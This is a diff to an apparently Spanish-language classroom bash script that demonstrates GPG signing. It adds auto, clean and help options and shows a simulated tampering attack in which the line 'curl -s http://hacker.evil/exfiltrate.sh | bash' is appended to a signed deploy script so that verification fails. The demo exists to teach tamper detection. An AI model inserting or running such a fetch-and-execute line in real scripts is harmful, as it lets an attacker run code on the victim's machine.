@@ -19,18 +19,29 @@
 
 set -uo pipefail
 
+AUTO_MODE=false
 AUTO_WAIT=0
 KEEP_TEMP=0
+CLEAN_ONLY=false
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
         --auto)
+            AUTO_MODE=true
             AUTO_WAIT="${2:-2}"
             shift 2
             ;;
         --keep)
             KEEP_TEMP=1
             shift
+            ;;
+        --clean|--limpiar)
+            CLEAN_ONLY=true
+            shift
+            ;;
+        --help|-h)
+            echo "Uso: ./demo_gpg.sh [--auto <segundos>] [--keep] [--clean|--limpiar]"
+            exit 0
             ;;
         *)
             shift
@@ -54,18 +65,24 @@ WORK_DIR="/tmp/demo_gpg_$$"
 export GNUPGHOME="${WORK_DIR}/gnupg_home"
 
 cleanup() {
-    if [ "$KEEP_TEMP" -eq 1 ]; then
-        echo -e "\n${C_YELLOW}ℹ [INFO] Preservando directorio temporal en: ${WORK_DIR}${C_RESET}\n"
+    if [ "$KEEP_TEMP" -eq 1 ] && [ "$CLEAN_ONLY" = false ]; then
+        echo -e "\n${C_YELLOW}ℹ [INFO] Preservando directorio temporal en: ${WORK_DIR}${C_RESET}"
+        echo -e "Para limpiar luego ejecutá: ./demo_gpg.sh --clean\n"
         return
     fi
     echo -e "\n${C_YELLOW}🧹 [LIMPIEZA] Eliminando archivos temporales y llaveros de prueba...${C_RESET}"
-    if [ -d "$WORK_DIR" ]; then
-        # Matar el gpg-agent del entorno aislado si sigue vivo
-        gpgconf --homedir "$GNUPGHOME" --kill gpg-agent 2>/dev/null || true
-        rm -rf "$WORK_DIR" 2>/dev/null || true
-    fi
+    for d in "$WORK_DIR" /tmp/demo_gpg_*; do
+        if [ -d "$d" ]; then
+            gpgconf --homedir "${d}/gnupg_home" --kill gpg-agent 2>/dev/null || true
+            rm -rf "$d" 2>/dev/null || true
+        fi
+    done
     echo -e "${C_GREEN}✔ Entorno temporal limpio.${C_RESET}\n"
 }
+if [ "$CLEAN_ONLY" = true ]; then
+    cleanup
+    exit 0
+fi
 trap cleanup EXIT INT TERM
 
 # Configuración amigable para TMUX
@@ -91,11 +108,11 @@ pie_clase() {
     
     echo -e "\n${C_BOLD}${C_YELLOW}❓ Pregunta: ${pregunta}${C_RESET}"
     if [ -n "$respuesta" ]; then
-        if [ "$AUTO_WAIT" -gt 0 ]; then
-            sleep 1
+        if [ "$AUTO_MODE" = true ]; then
+            sleep "$AUTO_WAIT"
         else
             echo -en "${C_DIM}   [Presioná ENTER para ver la respuesta...]${C_RESET} "
-            read -r </dev/tty 2>/dev/null || read -
+            read -r </dev/tty 2>/dev/null || read -r
         fi
         echo -e "   ${C_BOLD}${C_CYAN}✔ Respuesta esperada:${C_RESET} ${respuesta}\n"
     fi
@@ -103,12 +120,12 @@ pie_clase() {
 
 pause_step() {
     local msg="${1:-Presioná [ENTER] para continuar...}"
-    if [ "$AUTO_WAIT" -gt 0 ]; then
+    if [ "$AUTO_MODE" = true ]; then
         echo -e "\n${C_YELLOW}⏳ Esperando ${AUTO_WAIT}s (modo auto)...${C_RESET}"
         sleep "$AUTO_WAIT"
     else
         echo -e "\n${C_BOLD}${C_GREEN}▶ ${msg}${C_RESET}"
-        read -r </dev/tty 2>/dev/null || read -
+        read -r </dev/tty 2>/dev/null || read -r
     fi
 }
 
@@ -251,7 +268,7 @@ pause_step "Presioná [ENTER] para simular un ataque de manipulación (Tampering
 step_banner "5" "Prueba Forense: Detección de Ataque Malicioso"
 
 explain "Simulamos que un atacante interceptó el paquete y agregó un comando malicioso en el script:"
-echo "curl -s http://hacker.evil/exfiltrate.sh | bash" >> "${WORK_DIR}/deploy-app.sh"
+run_and_show "echo 'curl -s http://hacker.evil/exfiltrate.sh | bash' >> '${WORK_DIR}/deploy-app.sh' && cat '${WORK_DIR}/deploy-app.sh'"
 
 explain "El script ahora tiene una sola línea extra no autorizada. Verificamos nuevamente la firma:"
 run_and_show "gpg --verify ${WORK_DIR}/deploy-app.sh.asc ${WORK_DIR}/deploy-app.sh"
